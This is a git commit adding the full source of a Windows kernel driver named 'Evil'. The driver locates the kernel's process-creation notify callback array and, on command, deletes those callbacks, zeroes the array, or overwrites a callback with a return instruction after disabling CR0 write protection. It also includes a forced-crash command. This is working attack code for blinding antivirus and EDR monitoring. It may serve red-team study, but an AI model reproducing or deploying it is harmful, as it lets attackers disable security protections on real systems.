c232926c8a92c72bbbaddc2168f89ad499f6aacf
fdiskyou <rui@deniable.org>
2020-05-02 20:33:02 +0100

    add evil driver

---
+++ evil-driver/evil/Common.h
@@ -0,0 +1,79 @@
+#pragma once
+
+#define DRIVER_TAG 'live'
+#define DRIVER_PREFIX "[EVIL] "
+#define DRIVER_NAME	"Evil"
+
+#define EVIL_DRV		0x8000
+#define IOCTL_BASE	0x800
+
+#define CTL_CODE_HIDE(i)	\
+	CTL_CODE(EVIL_DRV, IOCTL_BASE+i, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+#define IOCTL_EVIL_BSOD				      CTL_CODE_HIDE(0)
+#define IOCTL_EVIL_LIST_MODULES		  CTL_CODE_HIDE(1)
+#define IOCTL_EVIL_ZEROOUT_ARRAY	  CTL_CODE_HIDE(2)
+#define IOCTL_EVIL_DELETE_CALLBACK	CTL_CODE_HIDE(3)
+#define IOCTL_EVIL_CALLBACK_RET		  CTL_CODE_HIDE(4)
+
+struct EvilData {
+	int list;
+	int remove;
+	int index;
+};
+
+struct ModulesData {
+	CHAR ModuleName[256];
+	ULONG64 ModuleBase;
+};
+
+// https://www.gaijin.at/en/infos/windows-version-numbers
+typedef enum _WINDOWS_INDEX {
+	WindowsIndexUNSUPPORTED = 0,
+	WindowsIndexXP = 1,
+	WindowsIndex2K3 = 2,
+	WindowsIndexVISTA = 3,
+	WindowsIndexWIN7 = 4,
+	WindowsIndexWIN8 = 5,
+	WindowsIndexWIN81 = 6,
+	WindowsIndexWIN10_1507 = 7,
+	WindowsIndexWIN10_1511 = 8,
+	WindowsIndexWIN10_1607 = 9,
+	WindowsIndexWIN10_1703 = 10,
+	WindowsIndexWIN10_1709 = 11,
+	WindowsIndexWIN10_1803 = 12,
+	WindowsIndexWIN10_1809 = 13,
+	WindowsIndexWIN10_1903 = 14,
+	WindowsIndexWIN10_1909 = 15,
+} WINDOWS_INDEX, * PWINDOWS_INDEX;
+
+// E8 - CALL
+// E9 - JMP
+// 2D - R13
+// 3D - R15
+UCHAR OPCODE_PSP[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x00 };
+UCHAR OPCODE_LEA[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2d, 0x00 };
+
+#pragma warning(disable:4201)
+
+typedef union {
+	struct {
+		UINT64 protection_enable : 1;
+		UINT64 monitor_coprocessor : 1;
+		UINT64 emulate_fpu : 1;
+		UINT64 task_switched : 1;
+		UINT64 extension_type : 1;
+		UINT64 numeric_error : 1;
+		UINT64 reserved_1 : 10;
+		UINT64 write_protect : 1;
+		UINT64 reserved_2 : 1;
+		UINT64 alignment_mask : 1;
+		UINT64 reserved_3 : 10;
+		UINT64 not_write_through : 1;
+		UINT64 cache_disable : 1;
+		UINT64 paging_enable : 1;
+	};
+
+	UINT64 flags;
+} cr0;
+
---
+++ evil-driver/evil/evil.cpp
@@ -0,0 +1,518 @@
+#include <ntifs.h>
+#include <ntddk.h>
+#include <intrin.h>
+#include <Aux_klib.h>
+#include "Common.h"
+
+#pragma intrinsic(__readmsr)
+
+void EvilUnload(_In_ PDRIVER_OBJECT DriverObject);
+NTSTATUS EvilCreateClose(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
+NTSTATUS EvilDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
+NTSTATUS EvilRead(_In_ PDEVICE_OBJECT, _In_ PIRP Irp);
+
+KIRQL g_irql;
+
+void CR0_WP_OFF_x64()
+{
+	cr0 mycr0;
+	mycr0.flags = __readcr0();
+	mycr0.write_protect = 0;
+	__writecr0(mycr0.flags);
+}
+
+void CR0_WP_ON_x64()
+{
+	cr0 mycr0;
+	mycr0.flags = __readcr0();
+	mycr0.write_protect = 1;
+	__writecr0(mycr0.flags);
+}
+
+WINDOWS_INDEX getWindowsIndex()
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	OSVERSIONINFOEXW osVersionInfo;
+	osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
+	status = RtlGetVersion((POSVERSIONINFOW)&osVersionInfo);
+	NT_ASSERT(NT_SUCCESS(status));
+
+	switch (osVersionInfo.dwBuildNumber)
+	{
+	case 2600:
+		return WindowsIndexXP;
+		break;
+	case 3790:
+		return WindowsIndex2K3;
+		break;
+	case 6000:
+	case 6001:
+	case 6002:
+		return WindowsIndexVISTA;
+		break;
+	case 7600:
+	case 7601:
+		return WindowsIndexWIN7;
+		break;
+	case 8102:
+	case 8250:
+	case 9200:
+		return WindowsIndexWIN8;
+	case 9431:
+	case 9600:
+		return WindowsIndexWIN81;
+		break;
+	case 10240:
+		return WindowsIndexWIN10_1507;
+		break;
+	case 10586:
+		return WindowsIndexWIN10_1511;
+		break;
+	case 14393:
+		return WindowsIndexWIN10_1607;
+		break;
+	case 15063:
+		return WindowsIndexWIN10_1703;
+		break;
+	case 16299:
+		return WindowsIndexWIN10_1709;
+		break;
+	case 17134:
+		return WindowsIndexWIN10_1803;
+		break;
+	case 17763:
+		return WindowsIndexWIN10_1809;
+		break;
+	case 18362:
+		return WindowsIndexWIN10_1903;
+		break;
+	case 18363:
+		return WindowsIndexWIN10_1909;
+		break;
+	default:
+		return WindowsIndexUNSUPPORTED;
+	}
+}
+
+WINDOWS_INDEX g_WindowsIndex;
+
+ULONG64 FindPspCreateProcessNotifyRoutine()
+{
+	LONG OffsetAddr = 0;
+	ULONG64	i = 0;
+	ULONG64 pCheckArea = 0;
+	UNICODE_STRING unstrFunc;
+
+	RtlInitUnicodeString(&unstrFunc, L"PsSetCreateProcessNotifyRoutine");
+	pCheckArea = (ULONG64)MmGetSystemRoutineAddress(&unstrFunc);
+	KdPrint(("[+] PsSetCreateProcessNotifyRoutine is at address: %llx \n", pCheckArea));
+
+	for (i = pCheckArea; i < pCheckArea + 20; i++)
+	{
+		if((*(PUCHAR)i == OPCODE_PSP[g_WindowsIndex]))
+		{
+			OffsetAddr = 0;
+			memcpy(&OffsetAddr, (PUCHAR)(i + 1), 4);
+			pCheckArea = pCheckArea + (i - pCheckArea) + OffsetAddr + 5;
+			break;
+		}
+	}
+
+	KdPrint(("[+] PspSetCreateProcessNotifyRoutine is at address: %llx \n", pCheckArea));
+
+	for (i = pCheckArea; i<pCheckArea + 0xff; i++)
+	{
+		if (*(PUCHAR)i == 0x4c && *(PUCHAR)(i + 1) == 0x8d && *(PUCHAR)(i + 2) == OPCODE_LEA[g_WindowsIndex])
+		{
+			OffsetAddr = 0;
+			memcpy(&OffsetAddr, (PUCHAR)(i + 3), 4);
+			return OffsetAddr + 7 + i;
+		}
+	}
+	return 0;
+}
+
+extern "C" NTSTATUS
+DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
+{
+	UNREFERENCED_PARAMETER(RegistryPath);
+
+	KdPrint(("[+] %s Driver says hello.\n", DRIVER_NAME));
+	g_WindowsIndex = getWindowsIndex();
+
+	DriverObject->DriverUnload = EvilUnload;
+	DriverObject->MajorFunction[IRP_MJ_CREATE] = EvilCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_CLOSE] = EvilCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = EvilDeviceControl;
+	DriverObject->MajorFunction[IRP_MJ_READ] = EvilRead;
+
+	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Evil");
+
+	PDEVICE_OBJECT DeviceObject;
+	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DeviceObject);
+	if (!NT_SUCCESS(status)) {
+		KdPrint(("[-] Evil Driver: Failed to create device (0x%08X)\n", status));
+		return status;
+	}
+	
+	DeviceObject->Flags |= DO_BUFFERED_IO;
+
+	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Evil");
+	status = IoCreateSymbolicLink(&symLink, &devName);
+	if (!NT_SUCCESS(status)) {
+		KdPrint(("[-] Evil Driver: Failed to create symbolic link (0x%08X)\n", status));
+		IoDeleteDevice(DeviceObject);
+		return status;
+	}
+
+	KdPrint(("[+] %s Driver DriverEntry has completed.\n", DRIVER_NAME));
+
+	return STATUS_SUCCESS;
+}
+
+void EvilUnload(_In_ PDRIVER_OBJECT DriverObject)
+{
+	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Evil");
+
+	IoDeleteSymbolicLink(&symLink);
+	IoDeleteDevice(DriverObject->DeviceObject);
+
+	KdPrint(("[+] %s Driver has been Unloaded.\n", DRIVER_NAME));
+}
+
+_Use_decl_annotations_
+NTSTATUS EvilCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+	UNREFERENCED_PARAMETER(DeviceObject);
+
+	Irp->IoStatus.Status = STATUS_SUCCESS;
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS DisplayModules()
+{
+	auto status = STATUS_SUCCESS;
+	ULONG  modulesSize;
+	AUX_MODULE_EXTENDED_INFO* modules;
+	ULONG  numberOfModules, i;
+
+	status = AuxKlibInitialize();
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("AuxKlibInitialize fail %d\n", status));
+		return status;
+	}
+
+	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
+	if (!NT_SUCCESS(status) || modulesSize == 0) {
+		return status;
+	}
+
+	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);
+
+	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
+	if (modules == NULL) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		return status;
+	}
+	RtlZeroMemory(modules, modulesSize);
+
+	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
+	if (!NT_SUCCESS(status)) {
+		ExFreePoolWithTag(modules, DRIVER_TAG);
+		return status;
+	}
+
+	KdPrint(("[ # ] ImageBase\t\t\tImageSize\t\t\t\t\t\t  FileName  FullPathName\n"));
+	for (i = 0; i < numberOfModules; i++)
+	{
+		KdPrint(("[%03d] %p\t", i, modules[i].BasicInfo.ImageBase));
+		KdPrint(("0x%08x\t", modules[i].ImageSize));
+		KdPrint(("%30s ", modules[i].FullPathName + modules[i].FileNameOffset));
+		KdPrint((" %s\n", modules[i].FullPathName));
+	}
+
+	ExFreePoolWithTag(modules, DRIVER_TAG);
+
+	return status;
+}
+
+_Use_decl_annotations_
+NTSTATUS EvilDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
+	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	auto status = STATUS_SUCCESS;
+	
+	switch (stack->Parameters.DeviceIoControl.IoControlCode) 
+	{
+		case IOCTL_EVIL_LIST_MODULES:
+		{
+			DisplayModules();
+			break;
+		}
+		case IOCTL_EVIL_DELETE_CALLBACK:
+		{
+			ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
+
+			if (!PspCreateProcessNotifyRoutine)
+				return STATUS_SUCCESS;
+
+			int i = 0;
+			ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+			auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+			if (data == nullptr)
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+
+			for (i = 0; i < 64; i++)
+			{
+				MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
+				NotifyAddr = *(PULONG64)(MagicPtr);
+				if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+				{
+					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+
+					if (data->index == i)
+					{
+						status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)NotifyAddr, TRUE);
+						if (NT_SUCCESS(status))
+							KdPrint((DRIVER_PREFIX "Callback Removed!\n"));
+						else
+							KdPrint((DRIVER_PREFIX "Callback Remove Failed!\n"));
+						break;
+					}
+				}
+			}
+			break;
+		}
+		case IOCTL_EVIL_CALLBACK_RET:
+		{
+			ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
+
+			if (!PspCreateProcessNotifyRoutine)
+				return STATUS_SUCCESS;
+
+			int i = 0;
+			ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+			auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+			if (data == nullptr)
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+
+			for (i = 0; i < 64; i++)
+			{
+				MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
+				NotifyAddr = *(PULONG64)(MagicPtr);
+				if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+				{
+					NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+					KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+
+					if (data->index == i)
+					{
+						int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);
+
+						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+						{
+							KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+							CR0_WP_OFF_x64();
+							KeRevertToUserAffinityThreadEx(oldAffinity);
+						}
+
+						PULONG64 pPointer = (PULONG64)NotifyAddr;
+						*pPointer = (ULONG64)0xc3;
+
+						for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
+						{
+							KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
+							CR0_WP_ON_x64();
+							KeRevertToUserAffinityThreadEx(oldAffinity);
+						}		
+						break;
+					}
+				}
+			}
+			break;
+		}
+		case IOCTL_EVIL_ZEROOUT_ARRAY:
+		{
+			ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
+
+			if (!PspCreateProcessNotifyRoutine)
+				return STATUS_SUCCESS;
+
+			int i = 0;
+			ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+			auto data = (EvilData*)Irp->AssociatedIrp.SystemBuffer;
+			if (data == nullptr)
+			{
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+
+			for (i = 0; i < 64; i++)
+			{
+				MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
+				NotifyAddr = *(PULONG64)(MagicPtr);
+				if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+				{
+					if (data->list)
+					{
+						NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+						KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+					}
+
+					if (data->remove)
+						*(PULONG64)(MagicPtr) = 0;
+				}
+			}
+
+			break;
+		}
+		case IOCTL_EVIL_BSOD:
+		{
+			KeBugCheck(0xDEADDEAD);
+			break;
+		}
+
+		default:
+			status = STATUS_INVALID_DEVICE_REQUEST;
+			break;
+	}
+
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = 0;
+	IoCompleteRequest(Irp, IO_NO_INCREMENT);
+	return status;
+}
+
+NTSTATUS SearchModules(ULONG64 ModuleAddr, ModulesData *ModuleFound)
+{
+	auto status = STATUS_SUCCESS;
+	ULONG  modulesSize;
+	AUX_MODULE_EXTENDED_INFO* modules;
+	ULONG  numberOfModules, i;
+
+	ModulesData ModuleFound2 = *ModuleFound;
+
+	status = AuxKlibInitialize();
+	if (!NT_SUCCESS(status))
+	{
+		KdPrint(("AuxKlibInitialize fail %d\n", status));
+		return status;
+	}
+
+	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), NULL);
+	if (!NT_SUCCESS(status) || modulesSize == 0) {
+		return status;
+	}
+
+	numberOfModules = modulesSize / sizeof(AUX_MODULE_EXTENDED_INFO);
+
+	modules = (AUX_MODULE_EXTENDED_INFO*)ExAllocatePoolWithTag(PagedPool, modulesSize, DRIVER_TAG);
+	if (modules == NULL) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+		return status; 
+	}
+	RtlZeroMemory(modules, modulesSize);
+
+	status = AuxKlibQueryModuleInformation(&modulesSize, sizeof(AUX_MODULE_EXTENDED_INFO), modules);
+	if (!NT_SUCCESS(status)) {
+		ExFreePoolWithTag(modules, DRIVER_TAG);
+		return status; 
+	}
+
+	for (i = 0; i < numberOfModules; i++)
+	{
+		if (ModuleAddr > (ULONG64)modules[i].BasicInfo.ImageBase && ModuleAddr < ((ULONG64)modules[i].BasicInfo.ImageBase + modules[i].ImageSize))
+		{
+			KdPrint(("Found: %s\n", modules[i].FullPathName + modules[i].FileNameOffset));
+			
+			strcpy(ModuleFound2.ModuleName, (CHAR*)(modules[i].FullPathName + modules[i].FileNameOffset));
+			ModuleFound2.ModuleBase = (ULONG64)modules[i].BasicInfo.ImageBase;
+
+			*ModuleFound = ModuleFound2;
+			ExFreePoolWithTag(modules, DRIVER_TAG);
+			return status;
+		}
+	}
+
+	ExFreePoolWithTag(modules, DRIVER_TAG);
+
+	return status;
+}
+
+// This is the most hackish code ever written, don't look
+NTSTATUS EvilRead(PDEVICE_OBJECT, PIRP Irp) {
+	auto status = STATUS_SUCCESS;
+	auto count = 0;
+
+	ModulesData ModuleFound;
+	ModuleFound.ModuleBase = 0;
+	::memset(ModuleFound.ModuleName, 0, sizeof(ModuleFound.ModuleName));
+
+	auto buffer = (UCHAR*)Irp->AssociatedIrp.SystemBuffer;
+	if (!buffer) {
+		status = STATUS_INSUFFICIENT_RESOURCES;
+	}
+	else {
+		ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
+
+		if (!PspCreateProcessNotifyRoutine)
+			return STATUS_SUCCESS;
+
+		ULONG64 i = 0;
+		ULONG64	NotifyAddr = 0, MagicPtr = 0;
+
+		for (i = 0; i < 64; i++)
+		{
+			MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
+			NotifyAddr = *(PULONG64)(MagicPtr);
+			if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
+			{
+				NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
+				KdPrint(("[%d] CreateProcessNotifyRoutine: %llx \n", i, NotifyAddr));
+				count += 16;
+				::memcpy(buffer, (ULONG64*)&i, 8);
+				buffer += 8;
+				::memcpy(buffer, (ULONG64*)&NotifyAddr, 8);
+				buffer += 8;
+
+				SearchModules(NotifyAddr, &ModuleFound);
+				if(ModuleFound.ModuleBase != 0)
+				{
+					::memcpy(buffer, ModuleFound.ModuleName, sizeof(ModuleFound.ModuleName));
+					buffer += 32;
+
+					ModuleFound.ModuleBase = NotifyAddr - ModuleFound.ModuleBase;
+
+					::memcpy(buffer, (ULONG64*)&ModuleFound.ModuleBase, 8);
+					buffer += 8;
+
+					count = count + 8 + 32;
+				}
+				else
+				{
+					count += 16;
+					::memcpy(buffer, ModuleFound.ModuleName, 8);
+					buffer += 8;
+					::memset(buffer, 0, 8);
+					buffer += 8;
+				}
+			}
+		}
+	}
+
+	Irp->IoStatus.Status = status;
+	Irp->IoStatus.Information = count;
+	IoCompleteRequest(Irp, 0);
+	return status;
+}
